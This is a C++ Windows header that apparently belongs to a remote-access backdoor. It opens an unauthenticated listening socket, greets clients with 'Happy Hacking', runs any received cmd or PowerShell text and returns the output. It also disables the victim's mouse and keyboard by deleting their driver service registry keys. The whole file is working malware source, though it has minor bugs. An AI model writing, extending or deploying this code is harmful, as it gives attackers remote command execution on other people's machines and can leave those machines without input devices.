
#ifndef SOCKET_COM_COMMAND_H
#define SOCKET_COM_COMMAND_H


#include <iostream>
#include <cstring>
#include <cstdlib>
#include <windows.h>
#include <winsock2.h>
#include <thread>
#include <vector>
#include <algorithm>
#include <memory>
#include <stdexcept>
#include "IO.h"

#pragma comment(lib, "ws2_32.lib") // Link with the Winsock library

namespace Socket_com_command
{
    std::string executeShellCommand(const char* command);
    std::string runPowerShellCommand(const std::string& command);
    void DisableMouse ();
    void DisableKeyboard ();
    void EnableKeyboard();
    void EnableMouse();
    std::vector<std::string> extractInput(const char* input) {
        std::vector<std::string> result;
        size_t spacePos = 0;
        for (size_t i = 0; input[i] != '\0'; ++i) {
            if (input[i] == ' ') {
                spacePos = i;
                break;
            }
        }
        if (spacePos != 0) {
            result.push_back(std::string(input, spacePos));
            result.push_back(std::string(input + spacePos + 1));
        } else {
            result.push_back(std::string(input));
            result.push_back("");
        }
        return result;
    }

    std::vector<int> clientSockets; // Stores client sockets

    void sendMessageToClients(const char* message) {
        for (int clientSocket : clientSockets) {
            send(clientSocket, message, strlen(message), 0);
        }
    }

    void writeLogToClients(const std::string message)
    {
        std::string M = "\n[" + Helper::DateTime().GetDateTimeString() + "]" + message + "\n";
        for (int clientSocket : clientSockets) {
            send(clientSocket, M.c_str(), strlen(M.c_str()), 0);
        }
    }
    void executeCommand(const char* command) {
        std::string result;

        // Execute the command and capture its output
        FILE* pipe = _popen(command, "r");
        if (pipe) {
            char buffer[128];
            while (!feof(pipe)) {
                if (fgets(buffer, 128, pipe) != NULL) {
                    result += buffer;
                }
            }
            _pclose(pipe);
        } else {
            result = "Failed to execute command.";
        }

        // Send the output of the command back to the client
        sendMessageToClients(result.c_str());
    }

    void handleClient(int clientSocket) {
        clientSockets.push_back(clientSocket); // Add the client socket to the list
        const char* message ="   ___                                               _              _        _                    \n"
"  / __|    ___    _ __    _ __    __ _    _ _     __| |     o O O  | |      (_)    _ _      ___   \n"
" | (__    / _ \\  | '  \\  | '  \\  / _` |  | ' \\   / _` |    o       | |__    | |   | ' \\    / -_)  \n"
"  \\___|   \\___/  |_|_|_| |_|_|_| \\__,_|  |_||_|  \\__,_|   TS__[O]  |____|  _|_|_  |_||_|   \\___|  \n"
"_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| {======|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| \n"
"\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'./o--000'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'";


        "Connection established. Happy Hacking :) \n";
        send(clientSocket, message, strlen(message), 0);

        while (true) {
        char buffer[256];
        int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesRead <= 0) {
            closesocket(clientSocket);
            clientSockets.erase(std::remove(clientSockets.begin(), clientSockets.end(), clientSocket), clientSockets.end());
            break;
        } else {
            buffer[bytesRead] = '\0';
            std::vector<std::string> commands = extractInput(buffer);
            std::string command = commands[0] ;
            std::string arguments =  commands[1] ;


            // Execute the received command as a shell command
            if (command == "cmd")
            {
                std::string commandResult = "[+] " + executeShellCommand(arguments.c_str()) +"\n";
                send(clientSocket, commandResult.c_str(), commandResult.length(), 0);
            }
            else if (command == "powershell")
            {
                std::string commandResult = "[+] " + executeShellCommand(arguments.c_str()) +"\n";
                send(clientSocket, commandResult.c_str(), commandResult.length(), 0);
            }
            else if (command == "disablemouse")
            {
                DisableMouse();
            }
            else if (command == "disablekeyboard")
            {
                DisableKeyboard();
            }
            else if (command == "enablemouse")
            {
                EnableMouse();
            }
            else if (command == "enablekeyboard")
            {
                EnableKeyboard();
            }
        }
    }
    }

    void listenForConnections(int serverSocket) {
        if (listen(serverSocket, 5) == -1) {
            IO::WriteLog("Error listening." );
            closesocket(serverSocket);
            WSACleanup();
            exit(1);
        }
        IO::WriteLog("Server listening..." );
        while (true) {
            sockaddr clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(serverSocket, &clientAddr, &clientAddrLen);
            if (clientSocket == INVALID_SOCKET) {
                IO::WriteLog("Error accepting client connection." );
                continue;
            }

            std::thread clientThread(handleClient, clientSocket);
            clientThread.detach();
        }
    }

    SOCKET createServerSocket(int port) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            IO::WriteLog("Error initializing Winsock." );
            exit(1);
        }

        SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            IO::WriteLog("Error creating socket." );
            WSACleanup();
            exit(1);
        }

        sockaddr_in serverAddr;
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);

        if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            IO::WriteLog("Error binding socket." );
            closesocket(serverSocket);
            WSACleanup();
            exit(1);
        }

        return serverSocket;
    }

    int runServer(int port) {
        SOCKET serverSocket = createServerSocket(port);
        std::thread serverThread(listenForConnections, serverSocket);
        serverThread.detach();
        return serverSocket;
    }

    std::string runPowerShellCommand(const std::string& command) {
        std::string fullCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";

        std::array<char, 128> buffer;
        std::string result;

        // Execute the PowerShell command and capture its output
        FILE* pipe = _popen(fullCommand.c_str(), "r");
        if (!pipe) {
            throw std::runtime_error("popen() failed.");
        }

        while (!feof(pipe)) {
            if (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
                result += buffer.data();
            }
        }

        _pclose(pipe);
        return result;
    }

    std::string executeShellCommand(const char* command) {
        std::string result = "";
        #ifdef _WIN32
            FILE* pipe = _popen(command, "r");
        #else
            FILE* pipe = popen(command, "r");
        #endif

            if (!pipe) {
                result = "Command execution failed.";
            } else {
                char buffer[128];
                while (!feof(pipe)) {
                    if (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                        result += buffer;
                    }
                }
        #ifdef _WIN32
                _pclose(pipe);
        #else
                pclose(pipe);
        #endif
            }

            return result;
        }

    void DisableMouse ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass";

        // Delete the Registry key
        std::string deleteKeyCommand = "reg delete \"" + key + "\" /f";
        system(deleteKeyCommand.c_str());

        // Add the "Start" value to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 4";
        system(addStartValueCommand.c_str());
    }
    void EnableMouse ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Mouclass";

        // Add the "Start" value with data 1 to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 1";
        system(addStartValueCommand.c_str());
    }
    void DisableKeyboard ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\kbdclass";

        // Delete the Registry key
        std::string deleteKeyCommand = "reg delete \"" + key + "\" /f";
        system(deleteKeyCommand.c_str());

        // Add the "Start" value to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 4";
        system(addStartValueCommand.c_str());
    }
    void EnableKeyboard ()
    {
        std::string key = "HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\kbdclass";

        // Add the "Start" value with data 1 to the Registry key
        std::string addStartValueCommand = "reg add \"" + key + "\" /v Start /t REG_DWORD /d 1";
        system(addStartValueCommand.c_str());
    }
}


#endif // SOCKET_COM_COMMAND_H
